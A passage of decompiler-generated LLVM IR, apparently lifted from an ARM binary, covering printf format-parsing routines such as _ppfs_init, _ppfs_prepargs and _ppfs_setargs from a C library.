  %v0_fc14 = phi i32 [ %v0_fc14.pre, %dec_label_pc_f6b4 ], [ %v3_fc10, %dec_label_pc_fc10 ]
  %v0_f7f8 = phi i32 [ %tmp100, %dec_label_pc_f6b4 ], [ %stack_var_-316.3, %dec_label_pc_fc10 ]
  %stack_var_-336.4 = phi i32 [ 0, %dec_label_pc_f6b4 ], [ %stack_var_-336.3, %dec_label_pc_fc10 ]
  store i32 %v0_fc14, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f6cc.outer

dec_label_pc_f6cc.outer:                          ; preds = %dec_label_pc_fc1c, %dec_label_pc_fc14
  %v5_f6f8 = phi i32 [ %v1_f728, %dec_label_pc_fc1c ], [ %v0_fc14, %dec_label_pc_fc14 ]
  %v0_f6cc49 = phi i32 [ %v1_fc1c, %dec_label_pc_fc1c ], [ %v0_fc14, %dec_label_pc_fc14 ]
  %stack_var_-336.1.ph = phi i32 [ %stack_var_-336.2, %dec_label_pc_fc1c ], [ %stack_var_-336.4, %dec_label_pc_fc14 ]
  %v1_f6cc180 = inttoptr i32 %v0_f6cc49 to i8*
  %v2_f6cc181 = load i8, i8* %v1_f6cc180, align 1
  %v3_f6cc182 = zext i8 %v2_f6cc181 to i32
  store i32 %v3_f6cc182, i32* %r3.global-to-local, align 4
  %v2_f6d0183 = icmp eq i8 %v2_f6cc181, 0
  br i1 %v2_f6d0183, label %dec_label_pc_f6e8, label %bb126

dec_label_pc_fc1c:                                ; preds = %dec_label_pc_f728
  %v1_fc1c = add i32 %v0_f730, 2
  store i32 %v1_fc1c, i32* @r4, align 4
  br label %dec_label_pc_f6cc.outer

dec_label_pc_fc24:                                ; preds = %dec_label_pc_fa94, %dec_label_pc_fbf8, %.thread36, %dec_label_pc_fb44, %dec_label_pc_fb28, %dec_label_pc_f9f8, %bb162, %dec_label_pc_f95c, %bb130, %dec_label_pc_fbd4
  br label %dec_label_pc_fc2c

dec_label_pc_fc2c:                                ; preds = %dec_label_pc_f71c, %bb, %dec_label_pc_f69c, %dec_label_pc_fc24
  %stack_var_-336.5 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_f69c ], [ -1, %dec_label_pc_fc24 ], [ %stack_var_-336.2, %dec_label_pc_f71c ]
  store i32 %stack_var_-336.5, i32* %r0.global-to-local, align 4
  store i32 %v6_f658, i32* @r5, align 4
  store i32 %v15_f658, i32* %r8.global-to-local, align 4
  store i32 %v18_f658, i32* @sb, align 4
  store i32 %v21_f658, i32* @sl, align 4
  store i32 %v24_f658, i32* @fp, align 4
  ret i32 %stack_var_-336.5

; uselistorder directives
  uselistorder i32 %stack_var_-336.5, { 1, 0 }
  uselistorder i32 %v1_fc1c, { 1, 0 }
  uselistorder i8 %v2_f6cc181, { 1, 2, 0 }
  uselistorder i32 %v0_f6cc49, { 2, 0, 1 }
  uselistorder i32 %v5_f6f8, { 2, 3, 1, 0 }
  uselistorder i32 %v0_f7f8, { 9, 12, 13, 2, 10, 8, 11, 6, 5, 4, 1, 0, 7, 3, 15, 14 }
  uselistorder i32 %v0_fc14, { 1, 0, 2 }
  uselistorder i32 %v1_fba8, { 2, 1, 0 }
  uselistorder i32 %v0_fbb0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_fb30, { 1, 0 }
  uselistorder i32 %v2_fb14, { 2, 0, 1 }
  uselistorder i1 %v3_faf4, { 1, 0 }
  uselistorder i32 %v0_fb04, { 0, 2, 3, 1 }
  uselistorder i32 %v2_fad8, { 1, 0 }
  uselistorder i32 %v0_fb1c, { 1, 0, 2 }
  uselistorder i32 %v3_faac, { 1, 2, 0 }
  uselistorder i32 %v0_fa5c, { 1, 0 }
  uselistorder i32 %v2_fa40, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_fa08, { 1, 2, 0, 3 }
  uselistorder i32 %v0_f9d4, { 1, 2, 0, 3 }
  uselistorder i32 %v1_f8d8, { 3, 2, 0, 4, 1, 5 }
  uselistorder i32 %v0_f8f4, { 1, 2, 3, 0 }
  uselistorder i32 %v6_f874, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_f7d8, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_f788.pre, { 2, 1, 0 }
  uselistorder i32 %v1_f780, { 1, 0 }
  uselistorder i32 %v1_f728, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-336.2, { 0, 8, 6, 1, 2, 5, 4, 3, 7 }
  uselistorder i32 %v2_f6e8, { 1, 0 }
  uselistorder i32 %v1_f6e0.lcssa, { 1, 0 }
  uselistorder i8 %v2_f6cc, { 1, 2, 0 }
  uselistorder i32 %v2_f6e0, { 1, 2, 3, 0 }
  uselistorder i1 %v7_f8ec, { 1, 0 }
  uselistorder i1 %v7_f838, { 1, 2, 0 }
  uselistorder i1 %v7_fa30, { 1, 0 }
  uselistorder i1 %v7_f990, { 1, 0 }
  uselistorder i1 %v7_f87c, { 1, 0 }
  uselistorder i32 %v2_f9d0, { 0, 2, 1, 3 }
  uselistorder i32 %v2_faa0, { 3, 2, 5, 4, 11, 10, 9, 7, 8, 6, 1, 0 }
  uselistorder i32* %v1_f7b0, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_f784, { 2, 4, 3, 5, 0, 1 }
  uselistorder i32 %v2_f764, { 1, 2, 0 }
  uselistorder i32 %v4_f75c, { 1, 0 }
  uselistorder i32 %v2_f660, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-332, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-328, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %tmp103, { 2, 1, 0 }
  uselistorder i32 %tmp102, { 19, 18, 15, 13, 8, 9, 0, 10, 12, 11, 3, 4, 5, 6, 7, 1, 2, 17, 16, 14 }
  uselistorder i32 %tmp101, { 6, 5, 3, 2, 0, 4, 1 }
  uselistorder i32 %tmp97, { 2, 1, 3, 0 }
  uselistorder i32* %r3.global-to-local, { 38, 3, 4, 1, 2, 5, 6, 39, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37 }
  uselistorder i32* %r2.global-to-local, { 22, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 25, 26, 20, 21, 23, 24, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 6, 5, 8, 7, 9, 10, 12, 11, 14, 13, 15, 16, 19, 17, 18, 21, 20, 23, 22, 25, 24, 27, 26, 30, 28, 43, 29, 44, 31, 32, 33, 34, 1, 45, 36, 35, 38, 37, 40, 39, 42, 41, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 11, { 7, 1, 2, 8, 9, 10, 11, 12, 0, 13, 14, 3, 4, 5, 6 }
  uselistorder i8 10, { 2, 3, 4, 5, 6, 0, 1, 7, 8, 9 }
  uselistorder i32 19, { 1, 0 }
  uselistorder i32 5, { 4, 0, 8, 9, 1, 14, 15, 16, 10, 5, 2, 11, 12, 6, 13, 3, 7 }
  uselistorder label %dec_label_pc_fc2c, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_fc24, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_fc14, { 1, 0 }
  uselistorder label %dec_label_pc_fbd4, { 1, 0 }
  uselistorder label %.thread36, { 1, 0 }
  uselistorder label %dec_label_pc_fb44, { 1, 0 }
  uselistorder label %.thread29, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %dec_label_pc_faf0, { 1, 0 }
  uselistorder label %dec_label_pc_fad4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_fad4thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_fac8, { 1, 0 }
  uselistorder label %dec_label_pc_fab8, { 0, 2, 1 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %dec_label_pc_fa4c, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb159, { 1, 0 }
  uselistorder label %bb157, { 4, 1, 2, 0, 3 }
  uselistorder label %bb154, { 1, 0 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 4, 3, 1, 0, 2 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %dec_label_pc_f828, { 1, 0 }
  uselistorder label %dec_label_pc_f824, { 2, 1, 0 }
  uselistorder label %bb139, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f77c, { 1, 0 }
  uselistorder label %bb134, { 1, 0 }
  uselistorder label %dec_label_pc_f71c, { 1, 0 }
  uselistorder label %bb130, { 1, 0 }
  uselistorder label %dec_label_pc_f6e8, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_fc4c = load i32, i32* @r4, align 4
  store i32 %v3_fc4c, i32* %stack_var_-12, align 4
  %v6_fc4c = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_fc58 = load i32, i32* @r1, align 4
  store i32 %v0_fc58, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_fc60 = bitcast i32* %arg1 to i8*
  %v3_fc60 = call i32 @__GI_memset(i8* %v2_fc60, i32 0)
  %v0_fc64 = load i32, i32* @r4, align 4
  %v1_fc64 = add i32 %v0_fc64, 24
  %v2_fc64 = inttoptr i32 %v1_fc64 to i32*
  %v3_fc64 = load i32, i32* %v2_fc64, align 4
  %v1_fc68 = add i32 %v3_fc64, -1
  store i32 %v1_fc68, i32* %v2_fc64, align 4
  %v0_fc70 = load i32, i32* @r5, align 4
  %v1_fc70 = load i32, i32* @r4, align 4
  %v2_fc70 = inttoptr i32 %v1_fc70 to i32*
  store i32 %v0_fc70, i32* %v2_fc70, align 4
  %v0_fc74 = load i32, i32* @r4, align 4
  %v1_fc74 = add i32 %v0_fc74, 40
  store i32 %v1_fc74, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_fc8419 = inttoptr i32 %v1_fc74 to i32*
  store i32 8, i32* %v2_fc8419, align 4
  %v3_fc8420 = load i32, i32* %r1.global-to-local, align 4
  %v4_fc8421 = add i32 %v3_fc8420, 4
  store i32 %v4_fc8421, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_fc7c.dec_label_pc_fc7c_crit_edge

dec_label_pc_fc7c.dec_label_pc_fc7c_crit_edge:    ; preds = %entry, %dec_label_pc_fc7c.dec_label_pc_fc7c_crit_edge
  %v4_fc8422 = phi i32 [ %v4_fc8421, %entry ], [ %v4_fc84, %dec_label_pc_fc7c.dec_label_pc_fc7c_crit_edge ]
  %v0_fc80.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_fc80 = add i32 %v0_fc80.pre, -1
  store i32 %v1_fc80, i32* %r2.global-to-local, align 4
  %v7_fc80 = icmp eq i32 %v0_fc80.pre, 1
  %v2_fc84 = inttoptr i32 %v4_fc8422 to i32*
  store i32 8, i32* %v2_fc84, align 4
  %v3_fc84 = load i32, i32* %r1.global-to-local, align 4
  %v4_fc84 = add i32 %v3_fc84, 4
  store i32 %v4_fc84, i32* %r1.global-to-local, align 4
  br i1 %v7_fc80, label %dec_label_pc_fc8c, label %dec_label_pc_fc7c.dec_label_pc_fc7c_crit_edge

dec_label_pc_fc8c:                                ; preds = %dec_label_pc_fc7c.dec_label_pc_fc7c_crit_edge
  %v0_fc8c = load i32, i32* @r5, align 4
  store i32 %v0_fc8c, i32* %r2.global-to-local, align 4
  %v1_fcd03 = inttoptr i32 %v0_fc8c to i8*
  %v2_fcd04 = load i8, i8* %v1_fcd03, align 1
  %v2_fcd46 = icmp eq i8 %v2_fcd04, 0
  br i1 %v2_fcd46, label %dec_label_pc_fcdc, label %dec_label_pc_fc9c

dec_label_pc_fc94:                                ; preds = %dec_label_pc_fcb4
  %v2_fc98 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_fc98, i32* @r4, align 4
  store i32 %v6_fc4c, i32* @r5, align 4
  ret i32 -1

dec_label_pc_fc9c:                                ; preds = %dec_label_pc_fc8c, %dec_label_pc_fcd0.backedge
  %v0_fca4 = phi i32 [ %storemerge, %dec_label_pc_fcd0.backedge ], [ %v0_fc8c, %dec_label_pc_fc8c ]
  %v2_fcd07 = phi i8 [ %v2_fcd0, %dec_label_pc_fcd0.backedge ], [ %v2_fcd04, %dec_label_pc_fc8c ]
  %v7_fc9c = icmp eq i8 %v2_fcd07, 37
  br i1 %v7_fc9c, label %dec_label_pc_fca4, label %dec_label_pc_fccc

dec_label_pc_fca4:                                ; preds = %dec_label_pc_fc9c
  %v1_fca4 = add i32 %v0_fca4, 1
  %v2_fca4 = inttoptr i32 %v1_fca4 to i8*
  %v3_fca4 = load i8, i8* %v2_fca4, align 1
  store i32 %v1_fca4, i32* %r2.global-to-local, align 4
  %v7_fca8 = icmp eq i8 %v3_fca4, 37
  br i1 %v7_fca8, label %dec_label_pc_fccc, label %dec_label_pc_fcb4

dec_label_pc_fcb4:                                ; preds = %dec_label_pc_fca4
  %v0_fcac = load i32, i32* @r4, align 4
  %v2_fcb4 = inttoptr i32 %v0_fcac to i32*
  store i32 %v1_fca4, i32* %v2_fcb4, align 4
  %v2_fcb8 = call i32 @_ppfs_parsespec(i32* %v2_fcb4)
  %v1_fcbc = icmp slt i32 %v2_fcb8, 0
  br i1 %v1_fcbc, label %dec_label_pc_fc94, label %dec_label_pc_fcc4

dec_label_pc_fcc4:                                ; preds = %dec_label_pc_fcb4
  %v0_fcc4 = load i32, i32* @r4, align 4
  %v1_fcc4 = inttoptr i32 %v0_fcc4 to i32*
  %v2_fcc4 = load i32, i32* %v1_fcc4, align 4
  br label %dec_label_pc_fcd0.backedge

dec_label_pc_fccc:                                ; preds = %dec_label_pc_fc9c, %dec_label_pc_fca4
  %v0_fccc = phi i32 [ %v0_fca4, %dec_label_pc_fc9c ], [ %v1_fca4, %dec_label_pc_fca4 ]
  %v1_fccc = add i32 %v0_fccc, 1
  br label %dec_label_pc_fcd0.backedge

dec_label_pc_fcd0.backedge:                       ; preds = %dec_label_pc_fccc, %dec_label_pc_fcc4
  %storemerge = phi i32 [ %v1_fccc, %dec_label_pc_fccc ], [ %v2_fcc4, %dec_label_pc_fcc4 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_fcd0 = inttoptr i32 %storemerge to i8*
  %v2_fcd0 = load i8, i8* %v1_fcd0, align 1
  %v2_fcd4 = icmp eq i8 %v2_fcd0, 0
  br i1 %v2_fcd4, label %dec_label_pc_fcd0.dec_label_pc_fcdc_crit_edge, label %dec_label_pc_fc9c

dec_label_pc_fcd0.dec_label_pc_fcdc_crit_edge:    ; preds = %dec_label_pc_fcd0.backedge
  %v0_fcdc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_fcdc

dec_label_pc_fcdc:                                ; preds = %dec_label_pc_fcd0.dec_label_pc_fcdc_crit_edge, %dec_label_pc_fc8c
  %v0_fcdc = phi i32 [ %v0_fcdc.pre, %dec_label_pc_fcd0.dec_label_pc_fcdc_crit_edge ], [ %v0_fc8c, %dec_label_pc_fc8c ]
  %v3_fcd0.lcssa.in = phi i8 [ %v2_fcd0, %dec_label_pc_fcd0.dec_label_pc_fcdc_crit_edge ], [ %v2_fcd04, %dec_label_pc_fc8c ]
  %v3_fcd0.lcssa = zext i8 %v3_fcd0.lcssa.in to i32
  %v1_fcdc = load i32, i32* @r4, align 4
  %v2_fcdc = inttoptr i32 %v1_fcdc to i32*
  store i32 %v0_fcdc, i32* %v2_fcdc, align 4
  %v2_fce0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_fce0, i32* @r4, align 4
  store i32 %v6_fc4c, i32* @r5, align 4
  ret i32 %v3_fcd0.lcssa

; uselistorder directives
  uselistorder i8 %v2_fcd0, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_fc8c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_fc84, { 1, 0 }
  uselistorder i32 %v0_fc80.pre, { 1, 0 }
  uselistorder i32 %v6_fc4c, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 5, 4, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 4, 5, 1, 2, 3 }
  uselistorder label %dec_label_pc_fccc, { 1, 0 }
  uselistorder label %dec_label_pc_fc9c, { 1, 0 }
  uselistorder label %dec_label_pc_fc7c.dec_label_pc_fc7c_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_fce4 = load i32, i32* @r4, align 4
  store i32 %v3_fce4, i32* %stack_var_-12, align 4
  %v1_fce8 = add i32 %arg1, 24
  %v2_fce8 = inttoptr i32 %v1_fce8 to i32*
  %v3_fce8 = load i32, i32* %v2_fce8, align 4
  store i32 %v3_fce8, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_fcf8 = add i32 %arg1, 76
  %v3_fcf8 = inttoptr i32 %v2_fcf8 to i32*
  store i32 %arg2, i32* %v3_fcf8, align 4
  %v7_fcfc = icmp sgt i32 %v3_fce8, 0
  br i1 %v7_fcfc, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v10_fcfc = load i32, i32* %stack_var_-12, align 4
  store i32 %v10_fcfc, i32* @r4, align 4
  ret i32 %arg1

bb4:                                              ; preds = %entry
  %v0_fd00 = load i32, i32* %r3.global-to-local, align 4
  %v2_fd00 = add i32 %arg1, 8
  %v3_fd00 = inttoptr i32 %v2_fd00 to i32*
  store i32 %v0_fd00, i32* %v3_fd00, align 4
  %v0_fd04 = load i32, i32* %r5.global-to-local, align 4
  %v2_fd04 = add i32 %arg1, 28
  %v3_fd04 = inttoptr i32 %v2_fd04 to i32*
  store i32 %v0_fd04, i32* %v3_fd04, align 4
  %v0_fd08 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_fd08, i32* %v2_fce8, align 4
  %v0_fd0c = load i32, i32* %r3.global-to-local, align 4
  %v2_fd0c = add i32 %arg1, 4
  %v3_fd0c = inttoptr i32 %v2_fd0c to i32*
  store i32 %v0_fd0c, i32* %v3_fd0c, align 4
  %v0_fd10 = call i32 @_ppfs_setargs()
  %v0_fd14 = load i32, i32* %r5.global-to-local, align 4
  %v1_fd14 = load i32, i32* @r4, align 4
  %v2_fd14 = add i32 %v1_fd14, 24
  %v3_fd14 = inttoptr i32 %v2_fd14 to i32*
  store i32 %v0_fd14, i32* %v3_fd14, align 4
  %v2_fd18 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_fd18, i32* @r4, align 4
  ret i32 %v0_fd10

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 6, 5, 4, 2, 1, 3, 7 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_fd1c = load i32, i32* @r0, align 4
  %v1_fd1c = add i32 %v0_fd1c, 24
  %v2_fd1c = inttoptr i32 %v1_fd1c to i32*
  %v3_fd1c = load i32, i32* %v2_fd1c, align 4
  store i32 %v3_fd1c, i32* %r1.global-to-local, align 4
  %v2_fd20 = icmp eq i32 %v3_fd1c, 0
  %v3_fd24 = load i32, i32* @r4, align 4
  store i32 %v3_fd24, i32* %stack_var_-8, align 4
  %v1_fd28 = add i32 %v0_fd1c, 80
  store i32 %v1_fd28, i32* %ip.global-to-local, align 4
  %v1_fd2c = add i32 %v0_fd1c, 8
  %v2_fd2c = inttoptr i32 %v1_fd2c to i32*
  %v3_fd2c = load i32, i32* %v2_fd2c, align 4
  store i32 %v3_fd2c, i32* %r3.global-to-local, align 4
  %v6_fd34 = icmp eq i32 %v3_fd2c, -2147483648
  br i1 %v2_fd20, label %dec_label_pc_fd34, label %dec_label_pc_fe58

dec_label_pc_fd34:                                ; preds = %entry
  br i1 %v6_fd34, label %dec_label_pc_fd3c, label %dec_label_pc_fd54

dec_label_pc_fd3c:                                ; preds = %dec_label_pc_fd34
  %v1_fd3c = add i32 %v0_fd1c, 76
  %v2_fd3c = inttoptr i32 %v1_fd3c to i32*
  %v3_fd3c = load i32, i32* %v2_fd3c, align 4
  store i32 %v3_fd3c, i32* %r3.global-to-local, align 4
  %v1_fd40 = inttoptr i32 %v3_fd3c to i32*
  %v2_fd40 = load i32, i32* %v1_fd40, align 4
  store i32 %v2_fd40, i32* %r2.global-to-local, align 4
  %v1_fd44 = add i32 %v3_fd3c, 4
  store i32 %v1_fd44, i32* %r3.global-to-local, align 4
  store i32 %v1_fd44, i32* %v2_fd3c, align 4
  %v0_fd4c = load i32, i32* %r2.global-to-local, align 4
  %v1_fd4c = load i32, i32* @r0, align 4
  %v2_fd4c = add i32 %v1_fd4c, 8
  %v3_fd4c = inttoptr i32 %v2_fd4c to i32*
  store i32 %v0_fd4c, i32* %v3_fd4c, align 4
  %v0_fd50 = load i32, i32* %r2.global-to-local, align 4
  %v1_fd50 = load i32, i32* @r0, align 4
  %v2_fd50 = add i32 %v1_fd50, 80
  %v3_fd50 = inttoptr i32 %v2_fd50 to i32*
  store i32 %v0_fd50, i32* %v3_fd50, align 4
  %v0_fd54.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_fd54

dec_label_pc_fd54:                                ; preds = %dec_label_pc_fd34, %dec_label_pc_fd3c
  %v1_fd6c = phi i32 [ %v0_fd1c, %dec_label_pc_fd34 ], [ %v0_fd54.pre, %dec_label_pc_fd3c ]
  %v1_fd54 = add i32 %v1_fd6c, 4
  %v2_fd54 = inttoptr i32 %v1_fd54 to i32*
  %v3_fd54 = load i32, i32* %v2_fd54, align 4
  store i32 %v3_fd54, i32* %r3.global-to-local, align 4
  %v6_fd58 = icmp eq i32 %v3_fd54, -2147483648
  br i1 %v6_fd58, label %dec_label_pc_fd60, label %dec_label_pc_fd78

dec_label_pc_fd60:                                ; preds = %dec_label_pc_fd54
  %v1_fd60 = add i32 %v1_fd6c, 76
  %v2_fd60 = inttoptr i32 %v1_fd60 to i32*
  %v3_fd60 = load i32, i32* %v2_fd60, align 4
  store i32 %v3_fd60, i32* %r3.global-to-local, align 4
  %v1_fd64 = inttoptr i32 %v3_fd60 to i32*
  %v2_fd64 = load i32, i32* %v1_fd64, align 4
  store i32 %v2_fd64, i32* %r2.global-to-local, align 4
  %v1_fd68 = add i32 %v3_fd60, 4
  store i32 %v1_fd68, i32* %r3.global-to-local, align 4
  store i32 %v1_fd68, i32* %v2_fd60, align 4
  %v0_fd70 = load i32, i32* %r2.global-to-local, align 4
  %v1_fd70 = load i32, i32* @r0, align 4
  %v2_fd70 = add i32 %v1_fd70, 4
  %v3_fd70 = inttoptr i32 %v2_fd70 to i32*
  store i32 %v0_fd70, i32* %v3_fd70, align 4
  %v0_fd74 = load i32, i32* %r2.global-to-local, align 4
  %v1_fd74 = load i32, i32* @r0, align 4
  %v2_fd74 = add i32 %v1_fd74, 80
  %v3_fd74 = inttoptr i32 %v2_fd74 to i32*
  store i32 %v0_fd74, i32* %v3_fd74, align 4
  %v0_fe4818.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_fd78

dec_label_pc_fd78:                                ; preds = %dec_label_pc_fd54, %dec_label_pc_fd60
  %v0_fe4818 = phi i32 [ %v1_fd6c, %dec_label_pc_fd54 ], [ %v0_fe4818.pre, %dec_label_pc_fd60 ]
  %v0_fd78 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_fd78, i32* %lr.global-to-local, align 4
  %v1_fe4819 = add i32 %v0_fe4818, 28
  %v2_fe4820 = inttoptr i32 %v1_fe4819 to i32*
  %v3_fe4821 = load i32, i32* %v2_fe4820, align 4
  store i32 %v3_fe4821, i32* %r3.global-to-local, align 4
  %v5_fe5023 = icmp slt i32 %v0_fd78, %v3_fe4821
  br i1 %v5_fe5023, label %dec_label_pc_fd80, label %dec_label_pc_fe54.loopexit

dec_label_pc_fd80:                                ; preds = %dec_label_pc_fd78, %dec_label_pc_fe44
  %v0_fe4825 = phi i32 [ %v0_fe48, %dec_label_pc_fe44 ], [ %v0_fe4818, %dec_label_pc_fd78 ]
  %v1_fd8024 = phi i32 [ %v1_fe44, %dec_label_pc_fe44 ], [ %v0_fd78, %dec_label_pc_fd78 ]
  %v4_fd80 = mul i32 %v1_fd8024, 4
  %v5_fd80 = add i32 %v0_fe4825, %v4_fd80
  store i32 %v5_fd80, i32* %r3.global-to-local, align 4
  %v1_fd84 = add i32 %v5_fd80, 40
  %v2_fd84 = inttoptr i32 %v1_fd84 to i32*
  %v3_fd84 = load i32, i32* %v2_fd84, align 4
  store i32 %v3_fd84, i32* %r2.global-to-local, align 4
  %v7_fd88 = icmp eq i32 %v3_fd84, 8
  br i1 %v7_fd88, label %dec_label_pc_fe44, label %dec_label_pc_fd90

dec_label_pc_fd90:                                ; preds = %dec_label_pc_fd80
  %v1_fd90 = add i32 %v0_fe4825, 76
  %v2_fd90 = inttoptr i32 %v1_fd90 to i32*
  %v3_fd90 = load i32, i32* %v2_fd90, align 4
  store i32 %v3_fd90, i32* %r1.global-to-local, align 4
  %v8_fd94 = icmp sgt i32 %v3_fd84, 8
  br i1 %v8_fd94, label %dec_label_pc_fdb8, label %dec_label_pc_fd98

dec_label_pc_fd98:                                ; preds = %dec_label_pc_fd90
  %v7_fd98 = icmp eq i32 %v3_fd84, 2
  br i1 %v7_fd98, label %dec_label_pc_fe04, label %dec_label_pc_fda0

dec_label_pc_fda0:                                ; preds = %dec_label_pc_fd98
  %v8_fda0 = icmp sgt i32 %v3_fd84, 2
  br i1 %v8_fda0, label %dec_label_pc_fdb0, label %dec_label_pc_fda4

dec_label_pc_fda4:                                ; preds = %dec_label_pc_fda0
  %v1_fda4 = icmp slt i32 %v3_fd84, 0
  br i1 %v1_fda4, label %dec_label_pc_fe30, label %dec_label_pc_fe04

dec_label_pc_fdb0:                                ; preds = %dec_label_pc_fda0
  %v7_fdb0 = icmp eq i32 %v3_fd84, 7
  br i1 %v7_fdb0, label %dec_label_pc_fe18, label %dec_label_pc_fe30

dec_label_pc_fdb8:                                ; preds = %dec_label_pc_fd90
  %v7_fdb8 = icmp eq i32 %v3_fd84, 1024
  br i1 %v7_fdb8, label %dec_label_pc_fe04, label %dec_label_pc_fdc0

dec_label_pc_fdc0:                                ; preds = %dec_label_pc_fdb8
  %v8_fdc0 = icmp sgt i32 %v3_fd84, 1024
  br i1 %v8_fdc0, label %dec_label_pc_fdd8, label %dec_label_pc_fdc4

dec_label_pc_fdc4:                                ; preds = %dec_label_pc_fdc0
  switch i32 %v3_fd84, label %dec_label_pc_fe30 [
    i32 256, label %dec_label_pc_fe04
    i32 512, label %dec_label_pc_fe04
  ]

dec_label_pc_fdd8:                                ; preds = %dec_label_pc_fdc0
  %v7_fdd8 = icmp eq i32 %v3_fd84, 2048
  br i1 %v7_fdd8, label %dec_label_pc_fdf0, label %dec_label_pc_fde8

dec_label_pc_fde8:                                ; preds = %dec_label_pc_fdd8
  store i32 2055, i32* %r3.global-to-local, align 4
  %v9_fde4 = icmp eq i32 %v3_fd84, 2055
  br i1 %v9_fde4, label %dec_label_pc_fe18, label %dec_label_pc_fe30

dec_label_pc_fdf0:                                ; preds = %dec_label_pc_fdd8
  %v1_fdf0 = add i32 %v3_fd90, 8
  store i32 %v1_fdf0, i32* %r3.global-to-local, align 4
  store i32 %v1_fdf0, i32* %v2_fd90, align 4
  %v0_fdf8 = load i32, i32* %r1.global-to-local, align 4
  %v1_fdf8 = inttoptr i32 %v0_fdf8 to i32*
  %v2_fdf8 = load i32, i32* %v1_fdf8, align 4
  store i32 %v2_fdf8, i32* %r3.global-to-local, align 4
  %v3_fdf8 = add i32 %v0_fdf8, 4
  %v4_fdf8 = inttoptr i32 %v3_fdf8 to i32*
  %v5_fdf8 = load i32, i32* %v4_fdf8, align 4
  store i32 %v5_fdf8, i32* %r4.global-to-local, align 4
  %v0_fdfc = load i32, i32* %ip.global-to-local, align 4
  %v1_fdfc = inttoptr i32 %v0_fdfc to i32*
  store i32 %v2_fdf8, i32* %v1_fdfc, align 4
  %v3_fdfc = add i32 %v0_fdfc, 4
  %v4_fdfc = inttoptr i32 %v3_fdfc to i32*
  %v5_fdfc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_fdfc, i32* %v4_fdfc, align 4
  br label %dec_label_pc_fe40

dec_label_pc_fe04:                                ; preds = %dec_label_pc_fdc4, %dec_label_pc_fdc4, %dec_label_pc_fda4, %dec_label_pc_fdb8, %dec_label_pc_fd98
  %v1_fe04 = inttoptr i32 %v3_fd90 to i32*
